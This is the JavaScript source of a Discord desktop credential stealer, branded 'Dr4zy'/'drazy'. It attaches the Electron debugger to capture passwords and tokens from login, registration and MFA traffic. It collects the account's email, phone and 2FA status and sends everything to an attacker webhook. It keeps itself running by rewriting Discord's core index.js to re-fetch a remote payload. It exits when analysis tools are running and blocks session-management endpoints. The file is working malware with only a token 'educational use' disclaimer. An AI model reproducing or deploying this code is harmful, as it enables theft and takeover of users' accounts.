const fs = require('fs');
const os = require('os');
const https = require('https');
const path = require('path');
const { BrowserWindow, session, net } = require('electron');

const CONFIG = {
    webhook: "%WEBHOOK%",
    injection_url: "https://raw.githubusercontent.com/hackirby/discord-injection/main/injection.js",
    API: "https://discord.com/api/v9/users/@me",
    filters: {
        urls: [
            '/auth/login',
            '/auth/register',
            '/auth/mfa/',
            '/mfa/totp',
            '/mfa/sms',
            '/users/@me',
        ],
    },
    filters2: {
        urls: [
            'wss://remote-auth-gateway.discord.gg/*',
            'https://discord.com/api/v*/auth/sessions',
            'https://*.discord.com/api/v*/auth/sessions',
            'https://discordapp.com/api/v*/auth/sessions'
        ],
    }
};

const badges = {
    staff: { emoji: "<:discordmod:1433560291559608460>", id: 1 << 0, rare: true },
    active_developer: { emoji: "<:activedeveloper:1433560289025986743>", id: 1 << 22, rare: false },
    early_supporter: { emoji: "<:earlysupporter:1433560286199156916>", id: 1 << 9, rare: true },
    verified_developer: { emoji: "<:discordbotdev:1433560283816923197>", id: 1 << 17, rare: true },
    certified_moderator: { emoji: "<:discordmod:1433560291559608460>", id: 1 << 18, rare: true },
    bug_hunter_level_1: { emoji: "<:bughunter1:1433560275222794281>", id: 1 << 3, rare: true },
    bug_hunter_level_2: { emoji: "<:bughunter2:1433560272093712598>", id: 1 << 14, rare: true },
    partner: { emoji: "<:partner:1433560269589844079>", id: 1 << 1, rare: true },
    hypesquad_house_1: { emoji: "<:hypesquadbalance:1433560268063113410>", id: 1 << 6, rare: false },
    hypesquad_house_2: { emoji: "<:hypesquadbravery:1433560265663713310>", id: 1 << 7, rare: false },
    hypesquad_house_3: { emoji: "<:hypesquadbrilliance:1433560262958383114>", id: 1 << 8, rare: false },
    hypesquad: { emoji: "<:hypesquadevents:1433560260202729582>", id: 1 << 2, rare: true },
    nitro: { emoji: "<:discordnitro:1433561619304026112>", rare: false },
    nitro_bronze: { emoji: "<:discordnitrobronze:1433561617408327752>", rare: false },
    nitro_silver: { emoji: "<:discordnitrosilver:1433561614619115520>", rare: false },
    nitro_gold: { emoji: "<:discordnitrogold:1433561612165320787>", rare: false },
    nitro_platinum: { emoji: "<:discordnitroplatinum:1433561610651172994>", rare: false },
    nitro_diamond: { emoji: "<:discordnitrodiamond:1433561608587706501>", rare: false },
    nitro_emerald: { emoji: "<:discordnitroemerald:1433561605819601057>", rare: false },
    nitro_ruby: { emoji: "<:discordnitroruby:1433561602635862016>", rare: false },
    nitro_opal: { emoji: "<:discordnitroopal:1433561599914020975>", rare: false },
    guild_booster_lvl1: { emoji: "<:discordboost1:1433563003776929862>", rare: false },
    guild_booster_lvl2: { emoji: "<:discordboost2:1433563195695431690>", rare: false },
    guild_booster_lvl3: { emoji: "<:discordboost3:1433563001344229508>", rare: false },
    guild_booster_lvl4: { emoji: "<:discordboost4:1433562999192420462>", rare: true },
    guild_booster_lvl5: { emoji: "<:discordboost5:1433562997112176711>", rare: true },
    guild_booster_lvl6: { emoji: "<:discordboost6:1433562994746327221>", rare: true },
    guild_booster_lvl7: { emoji: "<:discordboost7:1433562990421999818>", rare: true },
    guild_booster_lvl8: { emoji: "<:discordboost8:1433562987406295101>", rare: true },
    guild_booster_lvl9: { emoji: "<:discordboost9:1433562983996588143>", rare: true },
    quest_completed: { emoji: "<:quest:1433560258462220488>", rare: false },
    orb_profile_badge: { emoji: "<:orbs:1424472318243246192>", rare: false }
};

const DRAZY_AVATAR = "https://i.imgur.com/kK67EAV.png";
const FOOTER_BRAND = "-# drazy.lol · @drazystealer";
const IS_COMPONENTS_V2 = 1 << 15;

const request = async (method, url, headers, data) => {
    return new Promise((resolve) => {
        try {
            const req = net.request({ method: method, url: url });
            for (const [key, value] of Object.entries(headers)) req.setHeader(key, value);
            req.on('response', (res) => {
                let d = "";
                res.on('data', c => d += c.toString());
                res.on('end', () => resolve(d));
            });
            req.on('error', () => resolve(""));
            if (data) req.write(data, 'utf-8');
            req.end();
        } catch (e) { resolve(""); }
    });
};

function GetDiscordDate(id) {
    const seconds = Math.floor(Number((BigInt(id) >> 22n) + 1420070400000n) / 1000);
    return `<t:${seconds}:D>`;
}

const executeJS = script => {
    const windows = BrowserWindow.getAllWindows();
    for (const win of windows) {
        if (win.webContents && (win.webContents.getURL().includes("discord.com") || win.webContents.getURL().includes("discordapp.com"))) {
            return win.webContents.executeJavaScript(script, true);
        }
    }
};

const getToken = async () => await executeJS(`(webpackChunkdiscord_app.push([[''],{},e=>{m=[];for(let c in e.c)m.push(e.c[c])}]),m).find(m=>m?.exports?.default?.getToken!==void 0).exports.default.getToken()`);

const fetchAccount = async (token) => {
    const res = await request("GET", CONFIG.API, { "Authorization": token });
    try { return JSON.parse(res); } catch (e) { return null; }
};

async function CurrentNitro(since) {
    if (!since) return { badge: null };
    const sd = new Date(since), cd = new Date();
    let passed = (cd.getFullYear() - sd.getFullYear()) * 12 + (cd.getMonth() - sd.getMonth());
    if (cd.getDate() < sd.getDate()) passed -= 1;
    const nitros = [
        { badge: "nitro", lowerLimit: 0, upperLimit: 0 },
        { badge: "nitro_bronze", lowerLimit: 1, upperLimit: 2 },
        { badge: "nitro_silver", lowerLimit: 3, upperLimit: 5 },
        { badge: "nitro_gold", lowerLimit: 6, upperLimit: 11 },
        { badge: "nitro_platinum", lowerLimit: 12, upperLimit: 23 },
        { badge: "nitro_diamond", lowerLimit: 24, upperLimit: 35 },
        { badge: "nitro_emerald", lowerLimit: 36, upperLimit: 59 },
        { badge: "nitro_ruby", lowerLimit: 60, upperLimit: 71 },
        { badge: "nitro_opal", lowerLimit: 72 },
    ];
    return { badge: nitros.find(b => passed >= b.lowerLimit && (b.upperLimit === undefined || passed <= b.upperLimit))?.badge || null };
}

async function GetBadges(id, token) {
    try {
        const res = await request("GET", `https://discord.com/api/v10/users/${id}/profile`, { "Authorization": token });
        const d = JSON.parse(res);
        if (!d || !Array.isArray(d.badges)) return "`No Badges`";
        const flags = d.badges.map(b => b.id);
        const nitro = await CurrentNitro(d.premium_since);
        if (nitro.badge) flags.unshift(nitro.badge);
        return flags.map(f => badges[f]?.emoji).filter(Boolean).join("") || "`No Badges`";
    } catch (e) { return "`No Badges`"; }
}

const hooker = async (token, password) => {
    const account = await fetchAccount(token);
    if (!account) return;

    const badgesStr = await GetBadges(account.id, token);
    const authorName = account.discriminator && account.discriminator !== "0" ? `${account.global_name || account.username}#${account.discriminator}` : (account.global_name || account.username);
    const mfaEnabled = account.mfa_enabled ? "`True`" : "`False`";
    const createdAt = GetDiscordDate(account.id);
    const emailDisplay = account.email ? `\`${String(account.email).replace(/`/g, "'")}\`` : "`No Mail`";
    const phoneNumber = account.phone || "`No Phone`";

    const drazyAvatar = "https://i.imgur.com/kK67EAV.png";
    const footerBrand = "-# drazy.lol · @drazystealer";

    const headBlock = `### Discord account\n> *Valid session · ${authorName} · \`${account.id}\`*`;
    const tokenBlock = `### Token & password\n\u2022 **Password** · \`${password || "Unknown"}\` \n\`\`\`\n${token}\n\`\`\``;
    const detailBlock = `### Security & profile\n\u2022 **Badges** · ${badgesStr || "`No Badges`"}\n\u2022 **2FA** · ${mfaEnabled}\n\u2022 **Created** · ${createdAt}\n\u2022 **Email** · ${emailDisplay}\n\u2022 **Phone** · ${phoneNumber}`;

    const payload = {
        username: `Dr4zy`,
        avatar_url: drazyAvatar,
        flags: IS_COMPONENTS_V2,
        components: [
            {
                type: 17,
                components: [
                    { type: 10, content: "-# Educational use only · authors are not liable for misuse." },
                    { type: 14, divider: true, spacing: 1 },
                    {
                        type: 9,
                        components: [
                            { type: 10, content: headBlock },
                            { type: 10, content: tokenBlock },
                            { type: 10, content: detailBlock },
                        ],
                        accessory: {
                            type: 11,
                            media: { url: drazyAvatar },
                            description: "Drazy.lol",
                        },
                    },
                    { type: 14, divider: false, spacing: 1 },
                    { type: 10, content: `${footerBrand}` },
                ],
            },
        ],
    };

    const webhookUrl = CONFIG.webhook + "?with_components=true";
    await request("POST", webhookUrl, { "Content-Type": "application/json" }, JSON.stringify(payload));
}

const { initAntidebugger } = require('../modulos/antidebugger');
initAntidebugger();

async function initiation() {
    const appPath = path.join(process.resourcesPath, 'app');
    const packageJson = path.join(appPath, 'package.json');
    const resourceIndex = path.join(appPath, 'index.js');
    const modulesPath = path.join(process.resourcesPath, "..", "modules");
    if (fs.existsSync(modulesPath)) {
        const coreVal = fs.readdirSync(modulesPath).find(x => x.includes("discord_desktop_core"));
        if (coreVal) {
            const indexJs = path.join(modulesPath, coreVal, "discord_desktop_core", "index.js");
            if (fs.existsSync(indexJs) && fs.readFileSync(indexJs, 'utf8') !== "module.exports = require('./core.asar')") {
                const startUpScript = `const fs = require('fs'), https = require('https'), { exec } = require('child_process');
const indexJs = '${indexJs.replace(/\\/g, '\\\\')}';
const CONFIG = { injection_url: '${CONFIG.injection_url}', webhook: '${CONFIG.webhook}' };
const blacklistedProcesses = ["httpdebuggerui.exe", "wireshark.exe", "fiddler.exe", "processhacker.exe", "x64dbg.exe", "x32dbg.exe", "dnspy.exe", "charles.exe", "idag64.exe", "ida64.exe"];
function checkProcesses() {
    exec('tasklist', (err, stdout) => {
        if (err) return;
        if (blacklistedProcesses.some(p => stdout.toLowerCase().includes(p.toLowerCase()))) process.exit(0);
    });
}
setInterval(checkProcesses, 3000);
function init() {
    https.get(CONFIG.injection_url, (res) => {
        let rawData = '';
        res.on('data', chunk => rawData += chunk);
        res.on('end', () => {
            fs.writeFileSync(indexJs, rawData.replace('%WEBHOOK%', CONFIG.webhook));
        });
    }).on("error", () => setTimeout(init, 10000));
}
if (fs.statSync(indexJs).size < 20000) init();
require('${path.join(process.resourcesPath, 'app.asar').replace(/\\/g, '\\\\')}');`;
                if (!fs.existsSync(appPath)) fs.mkdirSync(appPath);
                fs.writeFileSync(packageJson, JSON.stringify({ name: "discord", main: "index.js" }, null, 4));
                fs.writeFileSync(resourceIndex, startUpScript);
            }
        }
    }
}

const pendingRequests = new Map();
let lastPassword = null;

async function sendInjectionNotification() {
    let hostname = "Unknown", username = "Unknown";
    try {
        hostname = os.hostname();
        username = os.userInfo()?.username || process.env.USERNAME || "Unknown";
    } catch (e) { }
    const executionPath = process.execPath;
    let injectionPath = "Unknown";
    try {
        const modulesPath = path.join(process.resourcesPath, "..", "modules");
        if (fs.existsSync(modulesPath)) {
            const coreVal = fs.readdirSync(modulesPath).find(x => x.includes("discord_desktop_core"));
            if (coreVal) injectionPath = path.join(modulesPath, coreVal, "discord_desktop_core", "index.js");
        }
    } catch (e) { }

    const headline = `### Successfully injected\n> *Discord injection successful · ${username} · ${hostname}*`;
    const detailsBlock =
        `### Injection details\n` +
        `\u2022 **Path** · \`${injectionPath}\`\n` +
        `\u2022 **Host** · \`${hostname}\` (\`${username}\`)\n` +
        `\u2022 **Executable** · \`${executionPath}\``;

    const payload = {
        username: "Dr4zy",
        avatar_url: DRAZY_AVATAR,
        flags: IS_COMPONENTS_V2,
        components: [
            {
                type: 17,
                components: [
                    { type: 10, content: headline },
                    { type: 14, divider: true, spacing: 1 },
                    {
                        type: 9,
                        components: [{ type: 10, content: detailsBlock }],
                        accessory: {
                            type: 11,
                            media: { url: DRAZY_AVATAR },
                            description: "Drazy.lol",
                        },
                    },
                    { type: 14, divider: false, spacing: 1 },
                    { type: 10, content: FOOTER_BRAND }
                ]
            }
        ]
    };
    const webhookUrl = CONFIG.webhook + "?with_components=true";
    await request("POST", webhookUrl, { "Content-Type": "application/json" }, JSON.stringify(payload));
}

let initiationCalled = false;
const createWindow = async () => {
    const windows = BrowserWindow.getAllWindows();
    for (const win of windows) {
        if (!win.webContents) continue;
        const url = win.webContents.getURL();
        if (url.includes("discord.com") || url.includes("discordapp.com")) {
            if (!initiationCalled) {
                initiationCalled = true;
                initiation();
                await win.webContents.session.clearStorageData();
                win.webContents.reload();
                return setTimeout(createWindow, 1000);
            }

            if (win.webContents.debugger.isAttached()) continue;

            try {
                win.webContents.debugger.attach('1.3');
                sendInjectionNotification();

                win.webContents.debugger.on('message', async (_, method, params) => {
                    if (method === 'Network.requestWillBeSent') {
                        if (params.request.method === 'POST' && CONFIG.filters.urls.some(u => params.request.url.includes(u))) {
                            try {
                                const postData = await win.webContents.debugger.sendCommand('Network.getRequestPostData', { requestId: params.requestId });
                                const data = JSON.parse(postData.postData);
                                if (data.password) {
                                    pendingRequests.set(params.requestId, data.password);
                                    lastPassword = data.password;
                                }
                            } catch (e) { }
                        }
                    }

                    if (method === 'Network.responseReceived') {
                        if (!CONFIG.filters.urls.some(u => params.response.url.includes(u))) return;
                        if (![200, 201, 202, 204].includes(params.response.status)) return;

                        try {
                            const res = await win.webContents.debugger.sendCommand('Network.getResponseBody', { requestId: params.requestId });
                            const resData = JSON.parse(res.body);
                            const password = pendingRequests.get(params.requestId) || lastPassword;

                            if (params.response.url.includes('/login') || params.response.url.includes('/register') || params.response.url.includes('/mfa/')) {
                                if (resData.token) await hooker(resData.token, password);
                                else if (resData.ticket && password) lastPassword = password;
                            } else if (params.response.url.includes('/@me')) {
                                const token = resData.token || await getToken();
                                if (token) await hooker(token, password);
                            }
                        } catch (e) { }
                    }
                });

                win.webContents.debugger.sendCommand('Network.enable');
                win.on('closed', createWindow);
            } catch (e) { }
        }
    }
    setTimeout(createWindow, 2000);
};

createWindow();

session.defaultSession.webRequest.onBeforeRequest(CONFIG.filters2, (details, callback) => {
    if (details.url.startsWith("wss://remote-auth-gateway") || details.url.endsWith("auth/sessions")) return callback({ cancel: true });
    callback({});
});

module.exports = require("./core.asar");
